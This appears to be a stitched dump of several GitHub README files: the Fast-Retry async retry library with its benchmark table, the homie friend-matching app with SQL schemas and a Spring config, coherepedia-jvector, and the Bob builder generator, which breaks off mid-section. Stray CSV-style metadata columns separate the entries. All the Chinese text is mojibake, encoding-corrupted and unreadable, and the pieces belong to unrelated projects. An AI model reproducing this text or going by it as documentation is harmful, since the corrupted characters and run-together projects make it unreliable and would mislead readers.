ä¸ä¸»æµçš„Spring-Retry, Guava-Retryç­‰åŒæ­¥é‡è¯•æ¡†æ¶ä¸åŒï¼ŒFast-Retryæ˜¯ä¸€ä¸ªæ”¯æŒå¼‚æ­¥é‡è¯•æ¡†æ¶ï¼Œæ”¯æŒå¼‚æ­¥ä»»åŠ¡çš„é‡è¯•ã€è¶…æ—¶ç­‰å¾…ã€å›è°ƒã€‚
Spring-Retry, Guava-Retryå‡æ— æ³•æ”¯æŒå¤§æ‰¹é‡ä»»åŠ¡çš„é‡è¯•ï¼Œå› ä¸ºä¼šå ç”¨è¿‡å¤šçº¿ç¨‹èµ„æºå¯¼è‡´å¤§é‡ä»»åŠ¡åœ¨ç­‰å¾…å¤„ç†ï¼Œéšç€ä»»åŠ¡æ•°çš„å¢åŠ ï¼Œç³»ç»Ÿååé‡å¤§å¤§é™ä½ï¼Œæ€§èƒ½æŒ‡æ•°çº§é™ä½ï¼ŒFast-Retryçš„æ€§èƒ½æ˜¯å‰è€…çš„æŒ‡æ•°å€ã€‚

ä¸‹å›¾æ˜¯ä¸‰è€…çš„æ€§èƒ½å¯¹æ¯”

- æµ‹è¯•çº¿ç¨‹æ± :  8ä¸ªå›ºå®šçº¿ç¨‹
- å•ä¸ªä»»åŠ¡é€»è¾‘:  è½®è¯¢5æ¬¡ï¼Œéš”2ç§’é‡è¯•ä¸€æ¬¡ï¼Œæ€»è€—æ—¶10ç§’
- æœªæµ‹é¢„è®¡å…¬å¼ï¼š  å½“æˆ‘ä»¬ä½¿ç”¨çº¿ç¨‹æ± çš„æ—¶å€™ï¼Œ ä¸€èˆ¬çº¿ç¨‹æ± ä¸­ æ€»ä»»åŠ¡å¤„ç†è€—æ—¶ =  ä»»åŠ¡æ•°/å¹¶å‘åº¦ x å•ä¸ªä»»åŠ¡é‡è¯•è€—æ—¶


| ä»»åŠ¡æ•°  | FastRetry |    Spring-Retry     |     Guava-Retry     |
| :-----: | :-------: | :-----------------: | :-----------------: |
|    1    |   10ç§’    |        10ç§’         |        10ç§’         |
|   10    | 10.066ç§’  |      20.092ç§’       |      20.078ç§’       |
|   50    | 10.061ç§’  |      70.186ç§’       |      70.168ç§’       |
|   100   | 10.077ç§’  |      130.33ç§’       |      130.31ç§’       |
|   500   | 10.154ç§’  |      631.420ç§’      |      631.53ç§’       |
|  1000   | 10.237ç§’  |      1254.78ç§’      |      1256.28ç§’      |
|  5000   | 10.482ç§’  |  æ²¡æµ‹é¢„è®¡ï¼š6250ç§’   |  æ²¡æµ‹é¢„è®¡ï¼š6250ç§’   |
|  10000  | 10.686ç§’  |  æ²¡æµ‹é¢„è®¡ï¼š12520ç§’  |  æ²¡æµ‹é¢„è®¡ï¼š12520ç§’  |
| 100000  |  13.71ç§’  | æ²¡æµ‹é¢„è®¡ï¼š125000ç§’  | æ²¡æµ‹é¢„è®¡ï¼š125000ç§’  |
| 500000  |  28.89ç§’  | æ²¡æµ‹é¢„è®¡ï¼š625000ç§’  | æ²¡æµ‹é¢„è®¡ï¼š625000ç§’  |
| 1000000 |  58.05ç§’  | æ²¡æµ‹é¢„è®¡ï¼š1250000ç§’ | æ²¡æµ‹é¢„è®¡ï¼š1250000ç§’ |


å¯ä»¥çœ‹åˆ°å³ä½¿æ˜¯å¤„ç†100ä¸‡ä¸ªä»»åŠ¡ï¼ŒFast-Retryçš„æ€§èƒ½ä¹Ÿæ¯”Spring-Retryå’ŒGuava-Retryå¤„ç†åœ¨50ä¸ªä»»åŠ¡æ—¶çš„æ€§èƒ½è¿˜è¦å¿«çš„å¤šçš„å¤šï¼Œ
è¿™ä¹ˆå¿«çš„ç§˜å¯†åœ¨äºé™¤äº†æ˜¯å¼‚æ­¥ï¼Œæ›´é‡è¦æ˜¯å½“åˆ«äººåœ¨é‡è¯•é—´éš”é‡Œä¼‘æ¯çš„æ—¶å€™ï¼ŒFast-Retryè¿˜åœ¨ä¸åœå¿™å‘½çš„å·¥ä½œç€ã€‚

## å¼•å…¥ä¾èµ–
```xml
    <dependency>
        <groupId>io.github.burukeyou</groupId>
        <artifactId>fast-retry-all</artifactId>
        <version>0.2.0</version>
    </dependency>
```

# å¿«é€Ÿå¼€å§‹
æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹å¼å»æ„å»ºæˆ‘ä»¬çš„é‡è¯•ä»»åŠ¡

## 1ã€ä½¿ç”¨é‡è¯•é˜Ÿåˆ—
```java
        ExecutorService executorService = Executors.newFixedThreadPool(8);
        RetryQueue queue = new FastRetryQueue(executorService);
        RetryTask<String> task = new RetryTask<String>() {
            int result = 0 ;
            @Override
            public long waitRetryTime() {
                return 2000;
            }

            @Override
            public boolean retry() {
                return ++result < 5;
            }

            @Override
            public String getResult() {
                return  result + """";
            }
        };
        CompletableFuture<String> future = queue.submit(task);
        log.info(""ä»»åŠ¡ç»“æŸ ç»“æœ:{}"",future.get());
```

## 2ã€ä½¿ç”¨FastRetryBuilder

```java
        RetryResultPolicy<String> resultPolicy = result -> result.equals(""444"");
        FastRetryer<String> retryer = FastRetryBuilder.<String>builder()
                .attemptMaxTimes(3)
                .waitRetryTime(3, TimeUnit.SECONDS)
                .retryIfException(true)
                .retryIfExceptionOfType(TimeoutException.class)
                .exceptionRecover(true)
                .resultPolicy(resultPolicy)
                .build();

        CompletableFuture<String> future = retryer.submit(() -> {
            log.info(""é‡è¯•"");
            //throw new Exception(""test"");
            //int i = 1/0;
            if (0 < 10){
                throw new TimeoutException(""test"");
            }
            return ""444"";
        });

        String o = future.get();
        log.info(""ç»“æœ{}"", o);
```

## 3ã€ä½¿ç”¨FastRetryæ³¨è§£
- ä¾èµ–Springç¯å¢ƒï¼Œæ‰€ä»¥éœ€è¦åœ¨é…ç½®ä¸ŠåŠ ä¸Š@EnableFastRetryæ³¨è§£å¯ç”¨é…ç½®æ‰ç”Ÿæ•ˆ
- å¦‚æœå°†ç»“æœç±»å‹ä½¿ç”¨CompletableFutureåŒ…è£…ï¼Œè‡ªåŠ¨è¿›è¡Œå¼‚æ­¥è½®è¯¢è¿”å›ï¼Œå¦åˆ™åŒæ­¥é˜»å¡ç­‰å¾…é‡è¯•ç»“æœã€‚ 

ä¸‹é¢å®šä¹‰ç­‰ä»·äº FastRetryer.executeæ–¹æ³•
```
    @FastRetry(retryWait = @RetryWait(delay = 2))
    public String retryTask(){
        return ""success"";
    }
``` 

ä¸‹é¢å®šä¹‰ç­‰ä»·äº FastRetryer.submitæ–¹æ³•,æ”¯æŒå¼‚æ­¥è½®è¯¢
```
    @FastRetry(retryWait = @RetryWait(delay = 2))
    public CompletableFuture<String> retryTask(){
        return CompletableFuture.completedFuture(""success"");
    }
```


",0,2,1,0.0,"['what', 'this']","['what', 'this']",2.0,"[org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.central:central-publishing-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,2.0,0.0
dnwwdwd/homieMatching,master,"# homie åŒ¹é…ç³»ç»Ÿ

> ä½œè€…ï¼šC1own
>
> [Github ä¸»é¡µ](https://github.com/dnwwdwd)
>
> [CSDN ä¸»é¡µ](https://blog.csdn.net/xyendjsj?type=blog)

![](https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609142339.png)



## é¡¹ç›®ä»‹ç»

homie åŒ¹é…ç³»ç»Ÿæ˜¯ä¸€ä¸ªç§»åŠ¨ç«¯ç½‘é¡µçš„åœ¨çº¿äº‘äº¤å‹å¹³å°ã€‚å®ç°äº†æŒ‰æ ‡ç­¾åŒ¹é…ã€æŸ¥æ‰¾ç”¨æˆ·ï¼ŒåŸºäº Redis GEO å®ç°æœç´¢é™„è¿‘ç”¨æˆ·ï¼ŒåŒæ—¶ä¸ªäººè¿˜å¯ä»¥å»ºé˜Ÿã€ç»„é˜Ÿä»¥æ‰“é€ ä¸ªäººå­¦ä¹ é˜Ÿä¼ã€‚é™¤äº†æ·»åŠ å¥½å‹ã€æœç´¢å¥½å‹å¤–ï¼Œè¿˜åŸºäº Websocket å®ç°å¥½å‹é—´ç§èŠï¼Œæ–¹ä¾¿ç”¨æˆ·å¯»æ‰¾å¿—åŒé“åˆçš„å­¦ä¹ æ­å­ã€‚

### çº¿ä¸Šåœ°å€

[åšç±³åŒ¹é…ç³»ç»Ÿ](http://hm.hejiajun.icu/)

### å‰ç«¯åœ°å€

[homie åŒ¹é…å‰ç«¯åœ°å€](https://github.com/dnwwdwd/homieMatching-fronted)

### åç«¯åœ°å€

[homie åŒ¹é…åç«¯åœ°å€](https://github.com/dnwwdwd/homieMatching)

### é¡¹ç›®éƒ¨ç½²æ•™ç¨‹

[homie åŒ¹é…éƒ¨ç½²æ•™ç¨‹](https://blog.csdn.net/xyendjsj/article/details/135921460?spm=1001.2014.3001.5501)



## æŠ€æœ¯é€‰å‹

### å‰ç«¯

| æŠ€æœ¯       | ç”¨é€”                       | ç‰ˆæœ¬   |
| ---------- | -------------------------- | ------ |
| Vue        | å‰ç«¯ç»å…¸æ¡†æ¶ï¼Œæ–¹ä¾¿å¼€å‘é¡µé¢ | 3.3.11 |
| Vue-Router | ç»†è‡´çš„å¯¼èˆªæ§åˆ¶             | 4      |
| Axios      | å‘é€è¯·æ±‚è‡³åç«¯             | 1.6.2  |
| Vant       | ç§»åŠ¨ç«¯æ ·å¼ç»„ä»¶åº“           | 4.8.0  |
| Vite       | å‰ç«¯æ„å»ºå·¥å…·               | 5.0.8  |



### åç«¯

| æŠ€æœ¯                 | ç”¨é€”                                         | ç‰ˆæœ¬    |
| -------------------- | -------------------------------------------- | ------- |
| Spring Boot          | å¿«æ„å»º Spring åº”ç”¨                           | 2.7.6   |
| JDK                  | Java åº”ç”¨å¼€å‘å·¥å…·                            | 1.8     |
| MyBatis              | æ“ä½œæ•°æ®åº“çš„æ¡†æ¶                             | 3.5.2   |
| MyBatis-Plus         | MyBatisçš„å¢å¼ºæ¡†æ¶ï¼Œæ— éœ€ç¼–å†™ SQL è¯­å¥         | 3.5.2   |
| MySQL                | ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“äº§å“ï¼Œç”¨äºå­˜å‚¨æ•°æ®           | 8.0..33 |
| Redis                | ä¸€ä¸ªéå…³ç³»å‹æ•°æ®åº“äº§å“ï¼Œç”¨äºå­˜å‚¨æ•°æ®         | 5.      |
| WebSocket            | ä½¿å¾—å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„æ•°æ®äº¤æ¢å˜å¾—æ›´åŠ ç®€å• | 2.4.1   |
| Lombok               | å®ä½“ç±»æ–¹æ³•çš„å¿«é€Ÿç”Ÿæˆå·¥å…·                     |         |
| knife4j              | åœ¨çº¿æ¥å£æ–‡æ¡£ç”Ÿæˆçš„åº“                         | 2.0.9   |
| EasyExcel            | å¿«é€Ÿã€ä½å ç”¨åœ°æ“ä½œ Excel                     | 3.3.2   |
| hutool               | å¼ºè€Œå…¨çš„å·¥å…·åº“                               | 5.7.17  |
| Guava-Retrying       | æä¾›é‡è¯•æœºåˆ¶çš„åº“                             | 1.0.6   |
| Apache-commons-lang3 | å·¥å…·åº“                                       | 3.12.0  |



## ä¸ªäººä»‹ç»

ä¸€ä¸ªæ™®é€šå­¦æ ¡çš„å¤§ä¸‰å­¦ç”Ÿï¼Œå³å°†å¤§å››æ¯•ä¸šäº†ï¼Œæ­£åœ¨åšæ¯•è®¾ã€‚

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609142050.jpg"" alt=""597f123b20d2e350ad2916f61c377ef"" style=""zoom: 33%;"" />

> è§‰å¾—é¡¹ç›®è¿˜ä¸é”™çš„åŒå­¦å¯å¦ç»™æˆ‘é¡¹ç›®ç‚¹ä¸ª Star å‘¢ï¼Ÿå¦‚æœå¯ä»¥ï¼Œå°å¼Ÿä¸èƒœæ„Ÿæ¿€ï¼Œè°¢è°¢ï¼

## åŠŸèƒ½å±•ç¤º

ç™»å½•

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609143001.png"" alt=""image-20240609143001885"" style=""zoom: 67%;"" />

æ³¨å†Œ

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609142952.png"" alt=""image-20240609142952622"" style=""zoom: 67%;"" />

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609143117.png"" alt=""image-20240609143117032"" style=""zoom: 67%;"" />

é¦–é¡µ

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145323.png"" alt=""image-20240609145323203"" style=""zoom:67%;"" />

æŒ‰æ ‡ç­¾åŒ¹é…ç›¸ä¼¼ç”¨æˆ·

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145335.png"" alt=""image-20240609145335696"" style=""zoom:67%;"" />

æŒ‰æ ‡ç­¾æœç´¢ç”¨æˆ·

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145012.png"" alt=""image-20240609145012357"" style=""zoom:67%;"" />

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145002.png"" alt=""image-20240609145002577"" style=""zoom:67%;"" />

æŒ‰è·ç¦»æœç´¢ç”¨æˆ·

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145122.png"" alt=""image-20240609145122634"" style=""zoom:67%;"" />

å¥½å‹é¡µé¢

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145434.png"" alt=""image-20240609145434695"" style=""zoom:67%;"" />

æœç´¢å¥½å‹

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609171231.png"" alt=""image-20240609171231079"" style=""zoom:67%;"" />

å¥½å‹ç§èŠ

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145534.png"" alt=""image-20240609145534153"" style=""zoom:67%;"" />

å»ºé˜Ÿ

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609145549.png"" alt=""image-20240609145549455"" style=""zoom:67%;"" />

ä¸ªäººé¡µé¢

<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609143327.png"" alt=""image-20240609143327588"" style=""zoom: 67%;"" />



<img src=""https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609143357.png"" alt=""image-20240609143357705"" style=""zoom:67%;"" />



## é¡¹ç›®äº®ç‚¹

1. åŸºäº Spring AOP + Axios å®ç°å‰ç«¯ç™»å½•æ‹¦æˆª
2. åŸºäº Redis å®ç°åˆ†å¸ƒå¼ Session å­˜å‚¨
3. ä½¿ç”¨ Redis List ç»“æ„é…åˆ Vue-infinite-loading ç»„ä»¶å®ç°æ»‘åŠ¨åŠ è½½
4. Spring Scheduling + Redis åˆ†å¸ƒå¼é”å®ç°ç¼“å­˜é¢„çƒ­
5. äº†è§£ç¼–è¾‘è·ç¦»ç®—æ³•ï¼Œå¯ç”¨äºåŒ¹é…ç›¸ä¼¼å­—ç¬¦ä¸²ï¼Œå•è¯æ ¡éªŒ
6. åŸºäº Redis GEO å­˜å‚¨ç”¨æˆ·åœ°ç†å¾®ä¿¡ä¿¡æ¯ï¼Œå®ç°æœç´¢é™„è¿‘ç”¨æˆ·
7. åŸºäº Redis åˆ†å¸ƒå¼é”é˜²æ­¢ç”¨æˆ·é‡å¤å…¥é˜Ÿ
8. é€šè¿‡ Guava åº“å®ç°é‡è¯•æœºåˆ¶ï¼Œä¿è¯ç¼“å­˜æ•°æ®ä¸€è‡´æ€§
9. åŸºäº Websocket å®ç°ç”¨æˆ·é—´ç§èŠ
10. é›†æˆç¬¬ä¸‰æ–¹åº“ç”Ÿæˆæ¥å£æµ‹è¯•æ–‡æ¡£ï¼Œæ–¹ä¾¿æµ‹è¯•é¡¹ç›®æ¥å£
11. ç†Ÿæ‚‰ EasyExcel çš„ä½¿ç”¨
12. åŸºäº Axios å°è£…è¯·æ±‚å®ä¾‹ï¼Œæ–¹ä¾¿è¯·æ±‚åç«¯æ¥å£
13. ç†Ÿæ‚‰ Vant ç»„ä»¶åº“çš„ä½¿ç”¨
14. ç†Ÿæ‚‰ Vue3 setup è¯­æ³•
15. æŒæ¡ Vue-Router åŸºæœ¬ä½¿ç”¨



## æ•°æ®åº“è¡¨

> å¦‚æœå¤§å®¶æ‹‰å–äº†åç«¯æºç ï¼Œç›´æ¥æ‰¾åˆ° sql/create_sql.sql æ–‡ä»¶ç›´æ¥è¿è¡Œå³å¯åˆ›å»ºç›¸åº”æ•°æ®åº“å’Œè¡¨ç»“æ„

### ç”¨æˆ·è¡¨

```sql
/*ç”¨æˆ·è¡¨*/
create table hjj.user
(
    id           bigint auto_increment comment 'id'
        primary key,
    username     varchar(256)                       null comment 'ç”¨æˆ·æ˜µç§°',
    userAccount  varchar(256)                       null comment 'è´¦æˆ·',
    avatarUrl    varchar(1024)                      null comment 'ç”¨æˆ·å¤´åƒ' default 'https://www.keaitupian.cn/cjpic/frombd/0/253/936677050/470164789.jpg',
    gender       tinyint                            null comment 'ç”¨æˆ·æ€§åˆ«',
    profile      varchar(512)                       null comment 'ä¸ªäººç®€ä»‹',
    userPassword varchar(512)                       not null comment 'ç”¨æˆ·å¯†ç ',
    phone        varchar(128)                       null comment 'ç”µè¯',
    email        varchar(512)                       null comment 'é‚®ç®±',
    userStatus   int      default 0                 not null comment 'çŠ¶æ€ 0 - æ­£å¸¸',
    createTime   datetime default CURRENT_TIMESTAMP null comment 'åˆ›å»ºæ—¶é—´',
    updateTime   datetime default CURRENT_TIMESTAMP null on update CURRENT_TIMESTAMP comment 'æ›´æ–°æ—¶é—´',
    isDelete     tinyint  default 0                 not null comment 'æ˜¯å¦åˆ é™¤',
    userRole     int      default 0                 not null comment 'ç”¨æˆ·è§’è‰² 0 - æ™®é€šç”¨æˆ· 1 - ç®¡ç†å‘˜',
    planetCode   varchar(512)                       null comment 'æ˜Ÿçƒç¼–å·',
    tags         varchar(1024)                      null comment 'æ ‡ç­¾åˆ—è¡¨(json)',
    longitude    decimal(10, 6)                     null comment 'ç»åº¦',
    dimension    decimal(10, 6)                     null comment 'çº¬åº¦'
)
    comment 'ç”¨æˆ·';
```



### é˜Ÿä¼è¡¨

```sql
/*é˜Ÿä¼è¡¨*/
create table if not exists hjj.team
(
    id           bigint auto_increment comment 'id'
        primary key,
    teamName   		varchar(256)                        not null comment 'é˜Ÿä¼åç§°',
    description 	varchar(1024)                       null comment ' æè¿°',
    maxNum        	int    default 1              		null comment 'æœ€å¤§äººæ•°',
    expireTime      datetime							null comment 'è¿‡æœŸæ—¶é—´',
    userId 			bigint                              not null comment 'é˜Ÿä¼åˆ›å»ºè€…/é˜Ÿé•¿id',
    status         	tinyint default 0 		        	null comment 'é˜Ÿä¼çŠ¶æ€ - 0 - å…¬å¼€ï¼Œ 1 - ç§æœ‰ï¼Œ2 - åŠ å¯†
- ',
    password        varchar(512)                       null comment 'é˜Ÿä¼å¯†ç ',
    createTime   	datetime default CURRENT_TIMESTAMP null comment 'åˆ›å»ºæ—¶é—´',
    updateTime   	datetime default CURRENT_TIMESTAMP null on update CURRENT_TIMESTAMP comment 'æ›´æ–°æ—¶é—´',
    isDelete     	tinyint  default 0                 not null comment 'æ˜¯å¦åˆ é™¤'
)
    comment 'é˜Ÿä¼ä¿¡æ¯';
```



### ç”¨æˆ·å…³ç³»è¡¨

```sql
/*ç”¨æˆ·é˜Ÿä¼å…³ç³»*/
create table if not exists hjj.user_team
(
    id           bigint auto_increment comment 'id'
        primary key,
    userId 			bigint                             	comment 'ç”¨æˆ·id',
    teamId 			bigint                             	comment 'é˜Ÿä¼id',
    joinTime   	datetime 							    comment 'åŠ å…¥æ—¶é—´',
    createTime   	datetime default CURRENT_TIMESTAMP null comment 'åˆ›å»ºæ—¶é—´',
    updateTime   	datetime default CURRENT_TIMESTAMP null on update CURRENT_TIMESTAMP comment 'æ›´æ–°æ—¶é—´',
    isDelete     	tinyint  default 0                 not null comment 'æ˜¯å¦åˆ é™¤'
)
    comment 'ç”¨æˆ·é˜Ÿä¼å…³ç³»è¡¨';
```



### å¥½å‹è¡¨

```sql
/*å¥½å‹è¡¨*/
create table hjj.friend
(
    id         bigint auto_increment comment 'id'
        primary key,
    userId     bigint                             not null comment 'ç”¨æˆ·idï¼ˆå³è‡ªå·±idï¼‰',
    friendId   bigint                             not null comment 'å¥½å‹id',
    createTime datetime default CURRENT_TIMESTAMP null comment 'åˆ›å»ºæ—¶é—´',
    updateTime datetime default CURRENT_TIMESTAMP null on update CURRENT_TIMESTAMP comment 'æ›´æ–°æ—¶é—´',
    isDelete   tinyint  default 0                 not null comment 'æ˜¯å¦åˆ é™¤'
)
    comment 'å¥½å‹è¡¨';
```



### èŠå¤©è¡¨

```sql
/*èŠå¤©è¡¨*/
CREATE TABLE `chat`  (
                         `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'èŠå¤©è®°å½•id',
                         `fromId` bigint(20) NOT NULL COMMENT 'å‘é€æ¶ˆæ¯id',
                         `toId` bigint(20) NULL DEFAULT NULL COMMENT 'æ¥æ”¶æ¶ˆæ¯id',
                         `text` varchar(512) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
                         `chatType` tinyint(4) NOT NULL COMMENT 'èŠå¤©ç±»å‹ 1-ç§èŠ 2-ç¾¤èŠ',
                         `createTime` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'åˆ›å»ºæ—¶é—´',
                         `updateTime` datetime NULL DEFAULT CURRENT_TIMESTAMP,
                         `teamId` bigint(20) NULL DEFAULT NULL,
                         `isDelete` tinyint(4) NULL DEFAULT 0,
                         PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = 'èŠå¤©æ¶ˆæ¯è¡¨' ROW_FORMAT = COMPACT;
```



## é¡¹ç›®åˆå§‹åŒ–

### å‰ç«¯

åŸºç¡€ç¯å¢ƒ

- è½¯ä»¶ï¼šWebStorm 2022.2.5 / Vscode
- ç¯å¢ƒï¼šNode ç‰ˆæœ¬ï¼š18.0.2

1ï¼‰æ‹‰å–é¡¹ç›®

```bash
git clone https://github.com/dnwwdwd/homeiMatching-frontend.git
```

2ï¼‰å®‰è£…ä¾èµ–

```bash
npm install
```

3ï¼‰è¿è¡Œé¡¹ç›®

```bash
npm run dev
```

4ï¼‰æ‰“åŒ…é¡¹ç›®

```bash
npm run build
```



### æ•°æ®åº“

1ï¼‰å¯¹äºæ‹‰å»åç«¯é¡¹ç›®çš„åŒå­¦ç›´æ¥è¿è¡Œ /sql/create_sql.ql æ–‡ä»¶å³å¯ï¼Œå‰æç”µè„‘è£…äº† MySQLï¼ˆ5.7 æˆ– 8.x éƒ½å¯ï¼‰

2ï¼‰å®Œäº‹åå°† application.yml æ–‡ä»¶ä¸­æ•°æ®åº“çš„è´¦å·å¯†ç æ”¹ä¸ºè‡ªå·±çš„å³å¯ï¼Œå¯¹äº†æ­¤é¡¹ç›®è¿˜ç”¨äº† Redisï¼Œæ‰€ä»¥è¿˜è¦ä¿®æ”¹ Redis çš„è¿æ¥é…ç½®ï¼Œæœ‰å¯†ç çš„åŠ ä¸Šå¯†ç 

```yml
spring:
  profiles:
    active: dev
  mvc:
    pathmatch:
      matching-strategy: ant_path_matcher
  application:
    name: homieMatching
  datasource:
    driver-class-name: com.mysql.cj.jdbc.Driver
    url: jdbc:mysql://localhost:3306/hjj?characterEncoding=UTF-8
    username: root
    password: 123456
  session:
    timeout: 86400
    store-type: redis
  redis:
    port: 6379
    host: localhost
    database: 0
server:
  port: 8080
  servlet:
    context-path: /api
    session:
      cookie:
        domain: localhost
        same-site: none
        secure: true
mybatis-plus:
  configuration:
    map-underscore-to-camel-case: false
  global-config:
    db-config:
      logic-delete-field: isDelete
      logic-delete-value: 1
      logic-not-delete-value: 0
```



### åç«¯

åŸºç¡€ç¯å¢ƒ

- è½¯ä»¶ï¼šIDEA 2023.1.6
- JDK 1.8 + MySQL 8.0.33 + Redis 5.xï¼ˆæœ€å¥½æ˜¯ 5.x ä»¥ä¸Šï¼‰ + Spring Boot 2.7.6 

> æ›´ç»†çš„ç¯å¢ƒè¯·çœ‹ä¸Šé¢çš„æŠ€æœ¯é€‰å‹ï¼Œä¸Šé¢æœ‰å…·ä½“çš„ä¾èµ–å…³ç³»å’Œç‰ˆæœ¬ã€‚
>
> **å„ä½ä¸€å®šè¦æ³¨æ„åœ¨å¯åŠ¨åç«¯å‰ï¼Œä¸€å®šè¦å…ˆå»ºå¥½æ•°æ®åº“è¡¨å’Œå®‰è£… Redisï¼Œæ”¹å¥½ yml æ–‡ä»¶çš„è¿æ¥ä¿¡æ¯å†å¯åŠ¨åç«¯ã€‚**

1ï¼‰æ‹‰å–é¡¹ç›®

```bash
git clone https://github.com/dnwwdwd/homieMatching.git
```

2ï¼‰ç‚¹å‡»å°åœ†åœˆé‡æ–°åŠ è½½æ‰€æœ‰ Maven é¡¹ç›® ï¼Œä¸‹è½½ä¾èµ–ã€‚

![image-20240609154936738](https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609154936.png)

3ï¼‰å¯åŠ¨åç«¯

æ‰¾åˆ° HomieMatchingApplication ä¸»ç±»ï¼Œç‚¹å‡»è¿è¡Œå³å¯ã€‚

![image-20240609154419326](https://hejiajun-img-bucket.oss-cn-wuhan-lr.aliyuncs.com/img/20240609154419.png)



## é¡¹ç›®éƒ¨ç½²

[homie åŒ¹é…éƒ¨ç½²æ•™ç¨‹](https://blog.csdn.net/xyendjsj/article/details/135921460?spm=1001.2014.3001.5501)

è·Ÿç€ä¸Šé¢çš„æ•™ç¨‹ä¸€æ­¥ä¸€æ­¥æ¥å³å¯ï¼Œä¸è¡Œä½ ä¸ä¼šï¼Œå¦‚æœä¸­é—´æœ‰ä»»ä½•é—®é¢˜æ¬¢è¿åœ¨è¿™ä¸ªç½‘ç«™ï¼Œæˆ–è€… CSDN ä¸Šï¼Œäº¦æˆ–è€…æ˜¯å¾®ä¿¡ä¸Šå‘æˆ‘æé—®ã€‚è§‰å¾—é¡¹ç›®è¿˜ä¸é”™çš„è¯ï¼Œè¯·ç»™æˆ‘ç‚¹ä¸ª Star å‘—ï¼Œè°¢è°¢ï¼
",0,2,2,2.0,['homie'],['homie'],1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
jbellis/coherepedia-jvector,master,"# Coherepedia-JVector

This indexes the [Cohere v3 Wikipedia dataset](https://huggingface.co/datasets/Cohere/wikipedia-2023-11-embed-multilingual-v3) using [JVector](https://github.com/jbellis/jvector).

# Setup

Edit `download.py` with the location you want to save the 180GB dataset.
Then edit Main.java with the corresponding location.

# Usage

Run `Main` class (no maven targets, easiest is to import it to your ide)
",0,0,3,0.0,"['setup', 'usage']","['setup', 'usage']",1.0,[org.codehaus.mojo:exec-maven-plugin],0.0,1.0,0.0
jonas-grgt/bob,main,"# ğŸ‘·â€Bob [![Maven Central](https://img.shields.io/maven-central/v/io.jonasg/bob-annotations.svg)](https://search.maven.org/artifact/io.jonasg/bob-annotations) [![License](https://img.shields.io/github/license/jonas-grgt/bob.svg)](https://opensource.org/licenses/Apache-2.0)


ğŸª¶Lightweight Builder generator for Java

## Why Bob?

Bob serves as a lightweight alternative to Lombok's `@Builder` annotation with additional 
features such as the ability to create Step Builders.

## Installation
### Maven
```xml
<dependency>
    <groupId>io.jonasg</groupId>
    <artifactId>bob-annotations</artifactId>
    <version>${bob.version}</version>
    <scope>compile</scope>
</dependency>
<dependency>
    <groupId>io.jonasg</groupId>
    <artifactId>bob-processor</artifactId>
    <version>${bob.version}</version>
    <scope>provided</scope>
</dependency>
```
### Gradle
```groovy
dependencies {
  annotationProcessor ""io.jonasg:bob-processor:"" + bobVersion
  compileOnly ""io.jonasg:bob-annotations:"" + bobVersion
}
```

## Getting Started

Annotate the class with `@Buildable` to generate a builder for it.
    
```java
package my.garage;

@Buildable
public class Car {
	
    private Brand brand;
    private String color;
    private BigDecimal price;
	
    public Car(Brand brand, String color, BigDecimal price) {
        this.brand = brand;
        this.color = color;
        this.price = price;
    }
}
```

## Usage

### Basic Usage

By default,
Bob will look for the constructor with the most parameters
and will create setters for all parameters that have a matching field name. 
For parameters
that do not have a corresponding field, the default value for that type will be used.
In example `null` for `Integer` and zero for `int`.

If your class contains multiple constructors that tie for having the most parameters,
the first one will be selected. 
See `@Buildable.Constructor` if you want to change this behavior.

```java
@Buildable
public class Car {
    private String color;
    private BigDecimal price;
    
    public Car(Brand brand, int year, String color, BigDecimal price) {
        this.color = color;
        this.price = price;
    }
    
}
```

When building a car instance in this way `new CarBuilder().color(""red"").price(BigDecimal.ZERO).build();`
The car will be instantiated with the following constructor call:

```java
new Car(null, 0, ""red"", BigDecimal.ZERO);
```

Because `brand` and `year` aren't fields the default value for the corresponding types are used.


### Different constructor

If you want to use a different constructor instead of the default selected one, annotated it with `@Buildable.Constructor`

### Builder Strategies

The Strategy enumeration defines the strategies by which builders behave.

#### Permissive

The default strategy,
allows the creation of an object
even if not all constructor parameters are set or if some are set to null.
Fields not explicitly set will default to their inherent values
(e.g., null for object references, 0 for numeric types, and false for booleans).
This strategy is suitable when not all fields need explicit initialization,
allowing more flexibility.

```java
@Buildable
class Car {
```

#### Step Wise

